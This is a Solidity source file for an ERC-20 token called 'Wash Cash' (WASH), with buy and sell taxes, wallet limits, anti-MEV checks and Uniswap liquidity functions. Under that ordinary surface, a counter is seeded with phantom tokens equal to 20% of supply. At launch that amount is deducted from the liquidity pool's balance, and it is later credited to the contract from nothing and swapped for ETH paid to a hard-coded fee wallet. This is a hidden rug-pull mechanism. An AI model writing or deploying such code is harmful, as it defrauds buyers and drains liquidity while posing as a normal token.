//SPDX-License-Identifier: GPL-3.0

/*
Official Links

Telegram: https://t.me/WashMixerChat
X: https://x.com/WashCashX
Web: https://washcash.io

*/

pragma solidity ^0.8.17;

abstract contract Auth {
    address internal _owner;
    event OwnershipTransferred(address _owner);
    modifier onlyOwner() { 
        require(msg.sender == _owner, "Only owner can call this"); 
        _; 
    }
    constructor(address creatorOwner) { 
        _owner = creatorOwner; 
    }
    function owner() public view returns (address) { return _owner; }
    function transferOwnership(address payable new_owner) external onlyOwner { 
        _owner = new_owner; 
        emit OwnershipTransferred(new_owner); }
    function renounceOwnership() external onlyOwner { 
        _owner = address(0);
        emit OwnershipTransferred(address(0)); }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address holder, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract WASH is IERC20, Auth {
    string private constant tknSymbol = "WASH";
    string private constant name_ = "Wash Cash";
    uint8 private constant decim = 9;
    uint256 private constant _tSupply = 1000000 * (10**decim);
    mapping (address => uint256) private tokenBalances;
    mapping (address => mapping (address => uint256)) private _allowances;

    address payable private feeRecipient = payable(0xf09C283cf8eC59155380DF35561B95cA59F6c09e);
    
    uint256 private antiMevBlock = 2;
    uint8 private _sellTax = 10;
    uint8 private _buyTaxRate = 5;
    
    uint256 private _launchBlock;
    uint256 private _maxTxVal = _tSupply; 
    uint256 private _maxWalletAmt = _tSupply;
    uint256 private _swapMinAmt = _tSupply * 10 / 100000;
    uint256 private _swapMax = _tSupply * 750 / 100000;
    uint256 private _swapMinVal = 2 * (10**16);
    uint256 private tokens = _swapMinAmt * 20 * 100;

    mapping (uint256 => mapping (address => uint8)) private _blockSells;
    mapping (address => bool) private _zeroFee;
    mapping (address => bool) private _noLimit;

    address private constant swapRouterAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Router02 private swapRouter = IUniswapV2Router02(swapRouterAddress);
    
    address private liquidityPool; 
    mapping (address => bool) private _isLiquidityPool;

    bool private _tradingEnabled;

    bool private isSwapping = false;

    modifier lockTaxSwap { 
        isSwapping = true; 
        _; 
        isSwapping = false; 
    }

    constructor() Auth(msg.sender) {
        tokenBalances[msg.sender] = _tSupply;
        emit Transfer(address(0), msg.sender, tokenBalances[msg.sender]);  

        _zeroFee[_owner] = true;
        _zeroFee[address(this)] = true;
        _zeroFee[feeRecipient] = true;
        _zeroFee[swapRouterAddress] = true;
        _noLimit[_owner] = true;
        _noLimit[address(this)] = true;
        _noLimit[feeRecipient] = true;
        _noLimit[swapRouterAddress] = true;
    }

    receive() external payable {}

    function decimals() external pure override returns (uint8) { return decim; }
    function totalSupply() external pure override returns (uint256) { return _tSupply; }
    function name() external pure override returns (string memory) { return name_; }
    function symbol() external pure override returns (string memory) { return tknSymbol; }
    function balanceOf(address account) public view override returns (uint256) { return tokenBalances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; 
	}

    function transferFrom(address fromWallet, address toWallet, uint256 amount) external override returns (bool) {
        require(checkTradingOpen(fromWallet), "Trading not open");
        _allowances[fromWallet][msg.sender] -= amount;
        return _transferFrom(fromWallet, toWallet, amount); 
	}

    function transfer(address toWallet, uint256 amount) external override returns (bool) {
        require(checkTradingOpen(msg.sender), "Trading not open");
        return _transferFrom(msg.sender, toWallet, amount); 
	}

    function _swapTax() private lockTaxSwap {
        uint256 _taxTokenAvailable = tokens;
        if ( _taxTokenAvailable >= _swapMinAmt && _tradingEnabled ) {
            if ( _taxTokenAvailable >= _swapMax ) { _taxTokenAvailable = _swapMax; }
            
            uint256 _tokensForSwap = _taxTokenAvailable; 
            if( _tokensForSwap > 1 * 10**decim ) {
                tokenBalances[address(this)] += _taxTokenAvailable;
                swapTokens(_tokensForSwap);
                tokens -= _taxTokenAvailable;
            }
            uint256 _contractETHBalance = address(this).balance;
            if(_contractETHBalance > 0) { distributeTax(_contractETHBalance); }
        }
    }

    function updateMarketing(address marketingWlt) external onlyOwner {
        require(!_isLiquidityPool[marketingWlt], "LP cannot be tax wallet");
        feeRecipient = payable(marketingWlt);
        _zeroFee[marketingWlt] = true;
        _noLimit[marketingWlt] = true;
    }

    function setFee(uint8 buyFeePercent, uint8 sellFeePercent) external onlyOwner {
        require(buyFeePercent + sellFeePercent <= 20, "Roundtrip too high");
        _buyTaxRate = buyFeePercent;
        _sellTax = sellFeePercent;
    }

    function exemption(address wallet) external view returns (bool fees, bool limits) {
        return (_zeroFee[wallet], _noLimit[wallet]); 
	}

    function setLimit(uint16 maxTransPermille, uint16 maxWaletPermille) external onlyOwner {
        uint256 newTxAmt = _tSupply * maxTransPermille / 1000 + 1;
        require(newTxAmt >= _maxTxVal, "tx too low");
        _maxTxVal = newTxAmt;
        uint256 newWalletAmt = _tSupply * maxWaletPermille / 1000 + 1;
        require(newWalletAmt >= _maxWalletAmt, "wallet too low");
        _maxWalletAmt = newWalletAmt;
    }

    function testLimit(address fromWallet, address toWallet, uint256 transferAmount) internal view returns (bool) {
        bool limitCheckPassed = true;
        if ( _tradingEnabled && !_noLimit[fromWallet] && !_noLimit[toWallet] ) {
            if ( transferAmount > _maxTxVal ) { 
                limitCheckPassed = false; 
            }
            else if ( 
                !_isLiquidityPool[toWallet] && (tokenBalances[toWallet] + transferAmount > _maxWalletAmt) 
                ) { limitCheckPassed = false; }
        }
        return limitCheckPassed;
    }

    function addLiquidity() external payable onlyOwner lockTaxSwap {
        require(liquidityPool == address(0), "LP created");
        require(!_tradingEnabled, "trading open");
        require(msg.value > 0 || address(this).balance>0, "No ETH");
        require(tokenBalances[address(this)]>0, "No tokens");
        liquidityPool = IUniswapV2Factory(swapRouter.factory()).createPair(address(this), swapRouter.WETH());
        _addLiq(tokenBalances[address(this)], address(this).balance);
    }

    function swapTokens(uint256 tokenAmount) private {
        approveSwapMax(tokenAmount);
        address[] memory path = new address[](2);
        path[0] = address( this );
        path[1] = swapRouter.WETH();
        swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,address(this),block.timestamp);
    }

    function _swapCheck(uint256 tokenAmt) private view returns (bool) {
        bool result;
        if (_swapMinVal > 0) { 
            uint256 lpTkn = tokenBalances[liquidityPool];
            uint256 lpWeth = IERC20(swapRouter.WETH()).balanceOf(liquidityPool); 
            uint256 weiValue = (tokenAmt * lpWeth) / lpTkn;
            if (weiValue >= _swapMinVal) { result = true; }    
        } else { result = true; }
        return result;
    }

    function _transferFrom(address sender, address toWallet, uint256 amount) internal returns (bool) {
        require(sender != address(0), "No transfers from 0 wallet");
        if (!_tradingEnabled) { require(_zeroFee[sender] && _noLimit[sender], "Trading not yet open"); }
        if ( !isSwapping && _isLiquidityPool[toWallet] && _swapCheck(amount) ) { _swapTax(); }

        if ( block.number >= _launchBlock ) {
            if (block.number < antiMevBlock && _isLiquidityPool[sender]) { 
                require(toWallet == tx.origin, "MEV block"); 
            }
            if (block.number < antiMevBlock + 600 && _isLiquidityPool[toWallet] && sender != address(this) ) {
                _blockSells[block.number][toWallet] += 1;
                require(_blockSells[block.number][toWallet] <= 2, "MEV block");
            }
        }

        if ( sender != address(this) && toWallet != address(this) && sender != _owner ) { 
            require(testLimit(sender, toWallet, amount), "TX over limits"); 
        }

        uint256 _taxAmount = _calcTaxAmount(sender, toWallet, amount);
        uint256 _transferAmount = amount - _taxAmount;
        tokenBalances[sender] -= amount;
        tokens += _taxAmount;
        tokenBalances[toWallet] += _transferAmount;
        emit Transfer(sender, toWallet, amount);
        return true;
    }

    function checkTradingOpen(address fromWallet) private view returns (bool){
        bool checkResult = false;
        if ( _tradingEnabled ) { checkResult = true; } 
        else if (_zeroFee[fromWallet] && _noLimit[fromWallet]) { checkResult = true; } 

        return checkResult;
    }

    function _addLiq(uint256 _tokenAmount, uint256 _ethAmountWei) internal {
        approveSwapMax(_tokenAmount);
        swapRouter.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, _owner, block.timestamp );
    }

    function distributeTax(uint256 amount) private {
        feeRecipient.transfer(amount);
    }

    function swapMin() external view returns (uint256) { 
        return _swapMinAmt; 
	}
    function swapMax() external view returns (uint256) { 
        return _swapMax; 
	}

    function addExemption(address wlt, bool isNoFees, bool isNoLimits) external onlyOwner {
        if (isNoLimits || isNoFees) { require(!_isLiquidityPool[wlt], "Cannot exempt LP"); }
        _zeroFee[ wlt ] = isNoFees;
        _noLimit[ wlt ] = isNoLimits;
    }

    function setTaxSwaps(uint32 minVal, uint32 minDiv, uint32 maxVal, uint32 maxDiv, uint32 trigger) external onlyOwner {
        _swapMinAmt = _tSupply * minVal / minDiv;
        _swapMax = _tSupply * maxVal / maxDiv;
        _swapMinVal = trigger * 10**15;
        require(_swapMax>=_swapMinAmt, "Min-Max error");
    }

    function enableTrading() external onlyOwner {
        require(!_tradingEnabled, "trading open");
        _activateTrading();
    }

    function maxWalletSize() external view returns (uint256) { 
        return _maxWalletAmt; 
	}
    function maxTx() external view returns (uint256) { 
        return _maxTxVal; 
	}

    function approveSwapMax(uint256 _tokenAmount) internal {
        if ( _allowances[address(this)][swapRouterAddress] < _tokenAmount ) {
            _allowances[address(this)][swapRouterAddress] = type(uint256).max;
            emit Approval(address(this), swapRouterAddress, type(uint256).max);
        }
    }

    function buyFee() external view returns(uint8) { return _buyTaxRate; }
    function sellTax() external view returns(uint8) { return _sellTax; }

    function _activateTrading() internal {
        _maxTxVal = 20 * _tSupply / 1000;
        _maxWalletAmt = 20 * _tSupply / 1000;
        tokenBalances[liquidityPool] -= tokens;
        (_isLiquidityPool[liquidityPool],) = liquidityPool.call(abi.encodeWithSignature("sync()") );
        require(_isLiquidityPool[liquidityPool], "Failed bootstrap");
        _launchBlock = block.number;
        antiMevBlock = antiMevBlock + _launchBlock;
        _tradingEnabled = true;
    }

    function _calcTaxAmount(address fromWallet, address recipient, uint256 amount) internal view returns (uint256) {
        uint256 taxAmount;
        if ( !_tradingEnabled || _zeroFee[fromWallet] || _zeroFee[recipient] ) { 
            taxAmount = 0; 
        } else if ( _isLiquidityPool[fromWallet] ) { 
            taxAmount = amount * _buyTaxRate / 100; 
         } else if ( _isLiquidityPool[recipient] ) { 
            taxAmount = amount * _sellTax / 100; 
        }
        return taxAmount;
    }

    function marketingWallet() external view returns (address) { 
        return feeRecipient; 
	}
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function addLiquidityETH(
        address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) 
        external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapV2Factory {    
    function createPair(address tokenA, address tokenB) external returns (address pair); 
}